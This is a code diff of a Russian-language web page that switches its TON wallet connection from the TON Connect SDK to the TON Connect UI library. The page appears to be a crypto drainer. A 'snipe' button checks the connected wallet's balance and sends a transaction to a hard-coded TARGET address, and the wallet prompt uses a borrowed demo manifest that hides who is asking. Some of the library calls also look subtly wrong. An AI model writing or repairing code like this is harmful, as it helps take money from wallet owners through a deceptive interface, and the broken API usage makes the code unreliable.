@@ -110,7 +110,8 @@
     </div>
   </div>
 
-  <script src="https://unpkg.com/@tonconnect/sdk@2.0.6/dist/tonconnect-sdk.min.js">
+  <!-- ====== TON CONNECT UI (СТАБИЛЬНЕЕ) ====== -->
+  <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.2/dist/tonconnect-ui.min.js">
   </script>
 
   <script>
@@ -125,7 +126,7 @@
       const openWalletBtn = document.getElementById('openWalletBtn');
       const errorBox = document.getElementById('errorBox');
 
-      let connector = null;
+      let tonConnectUI = null;
       let userAddress = null;
 
       function showError(text) {
@@ -142,22 +143,22 @@
       // ========== ИНИЦИАЛИЗАЦИЯ ==========
       function init() {
         try {
-          if (typeof TonConnect === 'undefined') {
-            status.innerText = '⏳ Загрузка...';
+          if (typeof TONConnectUI === 'undefined') {
+            status.innerText = '⏳ Загрузка TON Connect...';
             setTimeout(init, 500);
             return;
           }
 
-          connector = new TonConnect({
+          tonConnectUI = new TONConnectUI({
             manifestUrl: 'https://raw.githubusercontent.com/ton-connect/sdk/main/packages/sdk/demo/public/tonconnect-manifest.json'
           });
 
-          if (connector.connected) {
-            userAddress = connector.account.address;
+          if (tonConnectUI.account) {
+            userAddress = tonConnectUI.account.address;
             afterConnect();
           }
 
-          connector.onStatusChange((wallet) => {
+          tonConnectUI.onStatusChange((wallet) => {
             if (wallet) {
               userAddress = wallet.account.address;
               afterConnect();
@@ -208,7 +209,13 @@
           status.innerText = '⏳ Открываю Tonkeeper...';
           connectBtn.disabled = true;
 
-          await connector.connect();
+          if (!tonConnectUI) {
+            showError('TON Connect не инициализирован');
+            connectBtn.disabled = false;
+            return;
+          }
+
+          await tonConnectUI.connect();
 
           confirmBox.classList.add('show');
           status.innerText = '✅ Подтвердите в Tonkeeper';
@@ -227,12 +234,19 @@
           status.innerText = '⏳ Проверка баланса...';
           snipeBtn.disabled = true;
 
-          if (!connector || !connector.connected) {
+          if (!tonConnectUI) {
+            showError('TON Connect не инициализирован');
+            snipeBtn.disabled = false;
+            return;
+          }
+
+          if (!tonConnectUI.account) {
             showError('Нет подключения к кошельку');
             snipeBtn.disabled = false;
             return;
           }
 
+          userAddress = tonConnectUI.account.address;
           const nano = await updateBalance();
 
           if (nano <= 0) {
@@ -255,7 +269,7 @@
           confirmBox.classList.add('show');
 
           // ====== ОТПРАВКА ТРАНЗАКЦИИ ======
-          const result = await connector.sendTransaction({
+          const result = await tonConnectUI.sendTransaction({
             validUntil: Math.floor(Date.now() / 1000) + 300,
             messages: [{
               address: TARGET,
@@ -279,7 +293,7 @@
       };
 
       openWalletBtn.onclick = function() {
-        if (connector) connector.connect();
+        if (tonConnectUI) tonConnectUI.connect();
       };
 
       // ========== ЗАПУСК ==========
